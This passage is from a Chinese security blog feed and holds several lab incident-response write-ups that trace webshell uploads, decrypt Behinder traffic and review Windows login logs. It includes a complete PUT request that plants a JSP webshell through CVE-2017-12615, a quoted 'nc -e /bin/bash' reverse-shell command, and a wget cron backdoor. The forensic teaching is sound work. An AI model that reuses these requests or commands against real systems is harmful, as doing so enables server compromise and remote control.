class="line">                    log_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">except</span> Exception:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 处理完成！共提取 <span class="subst">&#123;log_count&#125;</span> 条日志到 <span class="subst">&#123;LOG_FILE&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[!] 发生严重错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>这个脚本用到<code>scapy</code>库来进行网络数据包交互与操作，可以执行命令 <code>pip install scapy</code> 或 <code>sudo apt install python3-scapy</code> 下载。然后把脚本（假设命名为<code>decode.py</code>）和<code>pcap</code>文件（<code>network_traffic.pcap</code>）放在同一目录，执行命令运行脚本即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 decode.py</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250830193800416.png"></p><p>接着直接读取文本查看哪个IP出现最多</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> log.txt|awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>|<span class="built_in">sort</span>|<span class="built_in">uniq</span> -c|<span class="built_in">sort</span> -r -n|<span class="built_in">head</span> -n 10</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250830194058616.png"></p><p>发现<code>35.127.46.111</code>出现最多，MD5加密提交flag即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;475ed6d7f74f586fb265f52eb42039b6&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">第五届红明谷-异常行为溯源详细题解</summary>
    
    
    
    <category term="玄机靶场" scheme="https://waynejoon.github.io/categories/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="玄机靶场" scheme="https://waynejoon.github.io/tags/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>玄机靶场 | 冰蝎3.0-jsp流量分析</title>
    <link href="https://waynejoon.github.io/posts/Xuanji-CTF-Behinder-3.0-Traffic-Analysis/"/>
    <id>https://waynejoon.github.io/posts/Xuanji-CTF-Behinder-3.0-Traffic-Analysis/</id>
    <published>2025-08-29T14:02:19.000Z</published>
    <updated>2025-11-10T04:12:33.910Z</updated>
    
    <content type="html"><![CDATA[<h2 id="冰蝎3-0流量特征"><a href="#冰蝎3-0流量特征" class="headerlink" title="冰蝎3.0流量特征"></a>冰蝎3.0流量特征</h2><ul><li><strong>Content-Type</strong><br>POST请求的 <code>Content-Type</code> 固定为 <code>application/octet-stream</code>，属于强特征</li></ul><p><img src="https://oss.waynejoons.icu/picphoto/20250829203841563.png"></p><ul><li><strong>User-Agent</strong><br>内置了16个 <code>User-Agent</code> 头，通信时会随机挑选一个，但大多为老旧浏览器或罕见设备头，如果同一IP频繁变换UA且为这16个之一，可以高度怀疑是冰蝎</li><li><strong>Accept、Cache-Control</strong><br>Accept头常设为 <code>Accept: text/html, image/gif, image/jpeg, */*; q=.2, */*; q=.2</code> 或类似值，Cache-Control和Pragma常设为<code>no-cache</code>，表示直接从源服务器获取最新的响应，这些是冰蝎流量默认带的HTTP头，普通业务流量较少见</li></ul><p><img src="https://oss.waynejoons.icu/picphoto/20250829204637163.png"></p><ul><li><strong>Content-Length&#x2F;请求包长度</strong><br>因为冰蝎3.0使用AES-256加密算法，加密后的数据体积会膨胀，请求包长度一般会很大，超过正常业务范围</li></ul><p><img src="https://oss.waynejoons.icu/picphoto/20250829204859874.png"></p><p>想要更深入了解冰蝎3.0可以参考文章：<a href="https://www.freebuf.com/sectool/247009.html">冰蝎3.0流量特征分析（附特征）</a></p><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p><img src="https://oss.waynejoons.icu/picphoto/20250829163939781.png"></p><h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤#1"></a>步骤#1</h3><p><strong>黑客IP是什么？</strong></p><p>先用wireshark语法筛选出http流量</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829164305832.png"></p><p>快速分析一遍流量，大部分都是404，说明黑客正在进行目录扫描。拉到最后那里可以看到有个异常流量，通过<strong>PUT方法</strong>上传了<code>indeX.jsp</code>文件，且在请求头中伪造了多个指向本地地址的字段（如<code>X-Forwarded-For</code>），这种组合是典型的攻击特征，由此可判定该请求为攻击者发起的恶意文件上传行为</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829165356880.png"></p><p>因此黑客IP就是<code>192.168.31.61</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.31.61&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤#2"></a>步骤#2</h3><p><strong>黑客上传的Webshell名是什么？</strong></p><p>继续分析流量包，可以看到攻击者通过POST数据包与<code>indeX.jsp</code>进行通信，且响应内容为加密数据</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829170738501.png"></p><p>因此webshell名就是这个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;indeX.jsp&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤#3"></a>步骤#3</h3><p><strong>黑客上传WebShell的时间是多少？（格式如：flag{YYYY-MM-DD HH:MM:SS}）</strong></p><p>找到刚才黑客通过<strong>PUT方法上传的文件</strong>直接查看时间即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829202010142.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2025-02-22 07:47:38&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-4"><a href="#步骤-4" class="headerlink" title="步骤#4"></a>步骤#4</h3><p><strong>木马的解密key是什么?</strong></p><p>同样也是PUT方法的那个流量包，右键追踪HTTP流</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829171501675.png"></p><p>可以看到黑客上传的内容，具体利用的漏洞是Tomcat通过PUT方法进行任意文件写入（CVE-2017-12615），感兴趣的可以网上了解一下</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829172047902.png"></p><p>可以看到木马连接密码就在文件内容当中，长度为16字节（128位），一般用于AES对称加密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3f0af7bb4dbcfbd7&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-5"><a href="#步骤-5" class="headerlink" title="步骤#5"></a>步骤#5</h3><p><strong>黑客执行的第一个命令是什么?</strong></p><p>已知黑客是通过POST与<code>indeX.jsp</code>进行通信，我们修改wireshark语法搜索包含<code>indeX.jsp</code>的流量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;indeX.jsp&quot;</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250829182923377.png"></p><p>然后复制请求体data内容的<strong>ASCII值</strong>，如图所示</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829183018587.png"></p><p>这里用到希潭实验室的蓝队分析工具箱，下载地址：<a href="https://github.com/abc123info/BlueTeamTools">蓝队分析研判工具箱</a></p><p>把复制的数据和之前得到的密钥放进去解密</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829183611011.png"></p><p>可能受环境影响，我这边显示有点问题，不过内容还是可以看得懂。经过分析，前面几个数据包是冰蝎用于连接用的，分析到第四个时可以看到黑客执行的命令</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829184827463.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250829184509722.png"></p><p>因此黑客执行的第一个命令是<code>ifconfig</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ifconfig&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-6"><a href="#步骤-6" class="headerlink" title="步骤#6"></a>步骤#6</h3><p><strong>黑客上传的文件内容是什么?</strong></p><p>继续分析，发现长度为362的流量记录了创建文件的命令</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829191553272.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250829191722209.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4ZmxhZ3s0ODUzNzViN2IwNmFkODU2YTc4OGMwZDk1MjI5ZjM1Y30=</span><br></pre></td></tr></table></figure><p>但是解码后得到一堆乱码，那只能登进目标服务器查看对应文件内容了</p><p>题目没有给出对应的服务器账号密码，需要我们渗透进去，那我们可以仿照前面黑客PUT上传文件的方法，用抓包工具修改发包</p><p>先自己随便选一个协议，生成服务端</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829195750644.png"></p><p>然后复制生成的jsp代码，粘贴到body中，同时修改请求体信息与之前黑客PUT上传的内容一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PUT /6.jsp/ HTTP/1.1</span><br><span class="line">Host: 你的玄机靶机地址:8081</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cookie: JSESSIONID=3F426B8219ACAB91DF13B18D987842BC</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Originating-IP: 127.0.0.1</span><br><span class="line">X-Remote-IP: 127.0.0.1</span><br><span class="line">X-Remote-Addr: 127.0.0.1</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 782</span><br><span class="line"></span><br><span class="line">你的冰蝎jsp代码</span><br></pre></td></tr></table></figure><p>然后发包即可，状态码显示201表示成功</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829200045977.png"></p><p>在冰蝎连接webshell，根据你之前选的协议选择对应的类别即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829200227411.png"></p><p>连接后在<strong>文件管理</strong>处，找到<code>/home/xj/up.txt</code>，打开文件查看内容，成功拿到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829200345195.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250829200417431.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;485375b7b06ad856a788c0d95229f35c&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-7"><a href="#步骤-7" class="headerlink" title="步骤#7"></a>步骤#7</h3><p><strong>黑客下载的文件内容是什么?</strong></p><p>继续分析流量包，分析到最后一个请求包时发现有黑客执行下载文件的命令</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829201051081.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250829200641835.png"></p><p>对应路径为<code>/opt/apache-tomcat-8.5.19/conf/server.xml</code>，用冰蝎查看对应文件，成功找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829200811216.png"></p><p>当然也可以查看对应的响应包，同样也给出了flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829201003725.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3aacab9ca36a6894c75048e4faf47052&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-8"><a href="#步骤-8" class="headerlink" title="步骤#8"></a>步骤#8</h3><p><strong>服务器内的flag是什么？</strong></p><p>用冰蝎在服务器内找就可以，最终发现flag在<code>/root/flag.txt</code>里面</p><p><img src="https://oss.waynejoons.icu/picphoto/20250829201249812.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ae1d04dd3d15c6a18f904fe50fdf7eca&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">冰蝎3.0-jsp流量分析详细题解</summary>
    
    
    
    <category term="玄机靶场" scheme="https://waynejoon.github.io/categories/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="玄机靶场" scheme="https://waynejoon.github.io/tags/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>玄机靶场 | 第九章-blueteam 的小心思3</title>
    <link href="https://waynejoon.github.io/posts/Xuanji-CTF-Blue-Team-Forensics-3/"/>
    <id>https://waynejoon.github.io/posts/Xuanji-CTF-Blue-Team-Forensics-3/</id>
    <published>2025-08-28T14:54:34.000Z</published>
    <updated>2025-11-10T04:12:36.773Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>题目简述：服务器有对外链接请求的痕迹，现提供一段 waf 上截获的数据包，分析对应的虚拟机环境跟数据包，找到关键字符串并且尝试修复漏洞</p><p>账号：<code>root</code>，密码：<code>root123</code>，流量包在<code>/result.pcap</code></p><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p><img src="https://oss.waynejoons.icu/picphoto/20250828191310269.png"></p><h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤#1"></a>步骤#1</h3><p><strong>审计日志，攻击者下载恶意木马文件的 ip是多少 flag{ip}</strong></p><p>先通过wireshark语法筛选出http流量</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828200609478.png"></p><p>我们简单分析这个流量包，前面有大量的404状态码，表明黑客正在进行目录扫描。后面黑客发现了<code>evil.php</code>文件，但是不知道参数名是什么，对参数名进行了大量尝试，最后发现参数<code>command</code>可以执行命令</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828201925705.png"></p><p>继续分析，可以看到黑客执行命令把<code>shell.php</code>下载到目标机器上</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828203209679.png"></p><p>因此可知攻击者下载恶意木马文件的ip地址为<code>192.168.150.253</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.150.253&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤#2"></a>步骤#2</h3><p><strong>审计流量包，木马文件连接密码是什么? flag{xxx}</strong></p><p>继续向下分析，可以看到攻击者通过POST数据包与<code>shell.php</code>进行通信</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828203800821.png"></p><p>因此连接密码就是<code>cmd</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;cmd&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤#3"></a>步骤#3</h3><p><strong>审计流量包，攻击者反弹的IP和端口是什么? flag{ip:port}</strong></p><p>也是刚才的流量，我们对其内容进行<strong>base64解码</strong></p><p><img src="https://oss.waynejoons.icu/picphoto/20250828204620822.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250828204706988.png"></p><p>发现<code>@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);</code>，结合前面的特征，可以推断这是通过蚁剑连接的。继续分析流量，发现有个流量记录了外连命令，通过nc反弹shell获得控制权</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828205330955.png"></p><p>因此攻击者反弹的IP和端口是<code>192.168.150.199:4444</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.150.199:4444&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-4"><a href="#步骤-4" class="headerlink" title="步骤#4"></a>步骤#4</h3><p><strong>提交黑客上传恶意文件的 md5 md5sum xxx.so</strong></p><p>题目提示文件后缀是<code>.so</code>，我们直接wireshark语法搜索内容包含<code>.so</code>的流量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp and frame contains &quot;.so&quot;</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250828220325856.png"></p><p>可以看到通过redis主从复制上传了一个<code>module.so</code>动态链接库。前面的<strong>RESP协议</strong>是Redis 客户端和服务器之间通信使用的协议</p><p>那我们修改wireshark语法搜索<strong>RESP协议</strong>的流量</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828224546241.png"></p><p>经过分析，前面上传的<code>module.so</code>文件有问题，加载模块后无法执行命令</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828224759344.png"></p><p>后面上传了一个符合条件的<code>module.so</code>文件，成功执行系统命令</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828224923571.png"></p><p>攻击者执行了命令<code>nc -e /bin/bash 192.168.150.199 4444</code>反弹shell，因此可以确定这个就是恶意文件</p><p>登录目标靶机，在根目录下计算该文件的 MD5 值即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">md5sum</span> module.so</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250828192857451.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d41d8cd98f00b204e9800998ecf8427e&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-5"><a href="#步骤-5" class="headerlink" title="步骤#5"></a>步骤#5</h3><p><strong>攻击者在服务器内权限维持请求外部地址和恶意文件的地址 flag{<a href="http://xxxxxxxxxx/xx.xxx%7D">http://xxxxxxxxxx/xx.xxx}</a></strong></p><p>攻击者要想在服务器内维持权限，肯定是有后门的。然后题目说请求的外部地址和恶意文件的地址，那说明是会定期向外部发送请求的，我们直接查看计划任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br></pre></td></tr></table></figure><p>成功发现黑客留下的后门，通过<code>wget</code>定期向恶意地址下载webshell到目标机器，频率为每分钟执行一次</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828193116683.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;http://192.168.150.199:88/shell.php&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">第九章-blueteam 的小心思3详细题解</summary>
    
    
    
    <category term="玄机靶场" scheme="https://waynejoon.github.io/categories/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="玄机靶场" scheme="https://waynejoon.github.io/tags/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>玄机靶场 | 日志分析-windows日志分析base</title>
    <link href="https://waynejoon.github.io/posts/Xuanji-CTF-Windows-Security-Log-Analysis/"/>
    <id>https://waynejoon.github.io/posts/Xuanji-CTF-Windows-Security-Log-Analysis/</id>
    <published>2025-08-28T09:37:12.000Z</published>
    <updated>2025-11-10T04:13:01.969Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>题目描述：客户反映自己的用户在4月6日中午12点左右被挤掉线了，请你上机排查安全事件</p><p>RDP连接，端口3389，用户名：<code>Administrator</code>，密码：<code>4210bf?</code></p><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p><img src="https://oss.waynejoons.icu/picphoto/20250828171821676.png"></p><h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤#1"></a>步骤#1</h3><p><strong>客户机的系统安全日志文件所在的绝对路径是？</strong></p><p><code>win+r</code>输入<code>eventvwr.msc</code>，打开事件查看器</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828163049338.png"></p><p>然后点击<strong>windows日志</strong>，右键点击安全，打开属性</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828163230401.png"></p><p>可以看到一个日志路径，这就是系统安全日志文件所在路径</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828172055458.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%SystemRoot%\System32\Winevt\Logs\Security.evtx</span><br></pre></td></tr></table></figure><p>但这是相对路径，我们复制<code>Security.evtx</code>前面的路径，然后在文件资源管理器打开</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828163636089.png"></p><p>会跳转到目录<code>C:\Windows\System32\winevt\Logs</code>，这就是系统安全日志文件所在的绝对路径。该路径一般是固定的，建议记住该位置方便以后进行查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;C:\Windows\System32\winevt\Logs&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤#2"></a>步骤#2</h3><p><strong>恶意用户是利用什么协议发起的登录？</strong></p><p>题目提示客户反映自己的用户在<strong>4月6日中午12点左右</strong>被挤掉线了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828163940473.png"></p><p>先介绍一下常见的事件ID类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">4624 登录成功</span><br><span class="line">4625 登录失败，如果有人尝试破解系统密码，可以看到大量连续登录失败信息</span><br><span class="line">4726 删除用户</span><br><span class="line">4722 账号启用</span><br><span class="line">4725 账号禁用</span><br><span class="line">4723 修改密码</span><br><span class="line">4724 重置密码</span><br><span class="line">4634 注销成功</span><br><span class="line">4647 用户启动的注销</span><br><span class="line">4672 管理员登录</span><br><span class="line">4720 创建用户，使用系统漏洞攻击成功后，往往会创建一个用户，方便远程登录</span><br><span class="line">4732 加入安全组，常见于将新用户加入管理员组</span><br><span class="line">4733 移除出安全组</span><br><span class="line">4684 通过登陆界面登陆的</span><br></pre></td></tr></table></figure><p>我们返回事件查看器，设置筛选条件为4月6日早上9点到下午15点，由于是要查看攻击者是如何登陆的，所以事件ID我们选择4624和4625</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828164433294.png"></p><p>然后按照时间顺序逐个分析，我们主要关注登录的账号名、登录类型、登录是否成功以及登录源IP</p><p>其中登录类型是<strong>以数字的形式</strong>列举出来的，所以我们需要对照以下表格分析</p><table><thead><tr><th align="left">登录类型</th><th align="left">说明</th><th align="left">典型协议&#x2F;场景</th></tr></thead><tbody><tr><td align="left">2</td><td align="left">交互式登录（本地键盘或控制台）</td><td align="left">本地</td></tr><tr><td align="left">3</td><td align="left">网络登录（访问共享、SMB等）</td><td align="left">SMB、HTTP（除明文）</td></tr><tr><td align="left">4</td><td align="left">批处理（计划任务）</td><td align="left">本地&#x2F;系统</td></tr><tr><td align="left">5</td><td align="left">服务账号</td><td align="left">本地&#x2F;系统</td></tr><tr><td align="left">7</td><td align="left">解锁（屏幕锁解锁）</td><td align="left">本地</td></tr><tr><td align="left">8</td><td align="left">网络明文（如HTTP Basic认证）</td><td align="left">明文HTTP、Advapi</td></tr><tr><td align="left">9</td><td align="left">新凭证（RunAs带netonly参数等）</td><td align="left">本地与网络混合</td></tr><tr><td align="left">10</td><td align="left">远程交互登录（RDP等）</td><td align="left">RDP（远程桌面协议）</td></tr><tr><td align="left">11</td><td align="left">缓存交互（离线域登录）</td><td align="left">本地缓存</td></tr></tbody></table><p>分析到<code>2025/4/6 11:33:34</code>的日志时发现异常，出现了一个未知的IP，且登录失败，然后协议类型为10，也就是利用rdp登录</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828165541901.png"></p><p>继续向下分析，发现该IP尝试了<strong>多个用户名</strong>进行rdp远程登录</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828165930030.png"></p><p>根据收集的结果，总共尝试了<code>admin</code>、<code>XJ</code>、<code>XuanJi</code>、<code>XiaoMa</code>和<code>Administrator</code>这几个用户名，其中前四个都登录失败，最后一个<code>Administrator</code>登录成功，可以看出该IP在进行用户名爆破，因此推断这就是攻击者</p><p>所以恶意用户是利用<strong>rdp协议</strong>发起的登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;rdp&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤#3"></a>步骤#3</h3><p><strong>攻击者总共使用了几个账户名尝试登录？</strong></p><p>根据上一题的分析，可知攻击者使用了五个账号名尝试登录，分别为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin、XJ、XuanJi、XiaoMa、Administrator</span><br></pre></td></tr></table></figure><p>因此答案就是5</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-4"><a href="#步骤-4" class="headerlink" title="步骤#4"></a>步骤#4</h3><p><strong>攻击者总共在客户机上尝试创建了几个不同名用户？</strong></p><p>根据步骤二的常见事件ID类型，我们修改筛选条件为4720</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828170606089.png"></p><p>可以看到总共有五个日志，我们逐个分析</p><p><img src="https://oss.waynejoons.icu/picphoto/20250828170731351.png"></p><p>发现有两个账号名均为<code>hack</code>，然后还有三个分别是<code>hacker</code>、<code>hacker_real$</code>、<code>system13$</code>，因此攻击者总共在客户机上尝试创建了4个不同名的用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">日志分析-windows日志分析base详细题解</summary>
    
    
    
    <category term="玄机靶场" scheme="https://waynejoon.github.io/categories/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="玄机靶场" scheme="https://waynejoon.github.io/tags/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>CTFSHOW | 其他篇题解（三）web438 - web460</title>
    <link href="https://waynejoon.github.io/posts/ctfshow-others-3-web438-web460/"/>
    <id>https://waynejoon.github.io/posts/ctfshow-others-3-web438-web460/</id>
    <published>2025-08-27T07:50:29.000Z</published>
    <updated>2025-11-10T04:10:57.124Z</updated>
    
